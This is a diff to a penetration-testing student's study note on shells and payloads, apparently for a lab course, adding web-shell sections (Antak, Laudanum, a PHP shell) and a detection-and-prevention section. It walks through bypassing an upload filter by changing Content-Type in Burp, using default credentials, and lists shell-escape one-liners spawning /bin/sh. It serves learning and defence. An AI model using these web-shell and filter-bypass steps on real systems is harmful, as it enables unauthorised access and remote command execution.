@@ -1,8 +1,8 @@
 # Shells & Payloads
 
-> Status: 🟨 In progress (sections 1–13 of 17 filled)
+> Status: ✅ Complete (section 16 is the challenge lab to do myself)
 > Date started: 2026-10-26
-> Date finished: 
+> Date finished: 2026-10-27
 
 ## 1. Goal
 Get and stabilize command execution: shell types, generating payloads, catching the connection, and upgrading to a usable TTY.
@@ -191,6 +191,22 @@ cp /usr/share/laudanum/aspx/shell.aspx ./demo.aspx   # edit: add your IP to the 
 # upload demo.aspx via the app's upload feature → browse to it (e.g. /files/demo.aspx) → run commands (cmd /c systeminfo)
 ```
 
+**Antak** (ASPX web shell in the Nishang project) — PowerShell-themed, great on Windows/IIS; runs each command as a new process, can run scripts in memory + encode commands:
+```bash
+cp /usr/share/nishang/Antak-WebShell/antak.aspx ./Upload.aspx   # edit line 14: set a username + password (gates the shell); strip ASCII art
+# upload → browse to it → log in → PowerShell console in the browser (upload/download, Encode and Execute, run C2 one-liner)
+```
+
+**PHP web shell** (most web servers run PHP — ~78%). Example on rConfig (login `admin:admin` → Devices > Vendors > Add Vendor → Vendor Logo upload). The upload only allows images, so **bypass the filter in Burp**:
+```text
+# proxy Firefox through Burp (127.0.0.1:8080), upload a .php web shell (e.g. WhiteWinterWolf's) as the logo
+# intercept the POST → change  Content-Type: application/x-php  →  image/gif  → Forward
+# "Added new vendor" = uploaded → browse to /images/vendor/connect.php → non-interactive browser shell
+```
+**Web shell caveats:** apps may auto-delete uploads; limited interactivity (chaining like `whoami && hostname` may fail); non-interactive = unstable; leaves artifacts. Best practice: use it to get a **reverse shell**, then delete the payload — and document every file/payload name + hash (sha1/md5) and upload path for the report.
+
+Learning tip: **ippsec.rocks** indexes IppSec's HTB videos by keyword (search "aspx" etc.) and jumps to the timestamp.
+
 ## Upgrade to a full TTY (do this immediately)
 A raw `nc` shell has no tab-complete, no arrows, no `sudo`. Upgrade:
 ```bash
@@ -215,7 +231,24 @@ awk 'BEGIN{system("/bin/sh")}' ; perl -e 'exec "/bin/sh";'
 find . -exec /bin/sh \; -quit ; vim -c ':!/bin/sh'
 ```
 
-## Fix / defense
+## Detection & prevention (defensive side)
+**MITRE ATT&CK tactics tied to shells/payloads:**
+- **Initial Access** — compromise a public-facing host/service (web app, SMB, auth protocols) for a foothold.
+- **Execution** — attacker's code runs on the victim (this module's focus): browser RCE, PsExec one-liner, MSF exploit, uploaded payload called remotely.
+- **Command & Control (C2)** — persistent/interactive channel, often over standard ports/protocols (HTTP/S, DNS, NTP, even Slack/Discord/Teams); ranges from cleartext netcat to encrypted/obfuscated with proxies/redirectors/VPNs.
+
+**Events to watch:**
+- **File uploads** — app logs for malicious uploads; harden + monitor any internet-facing host.
+- **Suspicious non-admin actions** — a normal user running `whoami`/Bash/cmd, end-host→end-host SMB (not the usual host→infra). Enable command-line + PowerShell logging.
+- **Anomalous network sessions** — NetFlow for top talkers, heartbeats on nonstandard ports (**4444** = Meterpreter default), bulk GET/POST, odd remote logins. SIEM + firewall logs.
+
+**Network visibility** — maintain topology docs; L7-aware appliances (Meraki, Ubiquiti, Check Point, Palo Alto) + deep packet inspection act like network AV. Cleartext shells (netcat bind/reverse) are fully readable on the wire — a Wireshark follow-stream shows every command (e.g. `net user`/`net localgroup` adding a user). A baseline makes deviations obvious.
+
+**Protect end devices** — AV/Defender enabled (+ Defender Firewall on all profiles), patch management, monitoring/alerting. Human element (click a link/open a file) is the top vector after misconfig.
+
+**Mitigations:** application sandboxing · least privilege · host segmentation & hardening (STIG, DMZ for internet-facing) · inbound/outbound firewall rules + NAT (breaks many bind/reverse shells) · defense-in-depth.
+
+## Fix / defense (offensive-side takeaways)
 EGRESS filtering (block outbound to random ports/IPs) kills most reverse shells; app allow-listing; EDR on payload signatures; least privilege.
 
-> First move after catching a reverse shell: **upgrade the TTY** (python pty → `stty raw -echo; fg` → `export TERM=xterm`) so you get tab-complete, arrows, and `sudo`. A raw shell will bite you otherwise.
+> First move after catching a reverse shell: **upgrade the TTY** (python pty → `stty raw -echo; fg` → `export TERM=xterm`) so you get tab-complete, arrows, and `sudo`. A raw shell will bite you otherwise. Prefer a reverse shell over relying on a web shell, and delete payloads + document their hashes and paths.
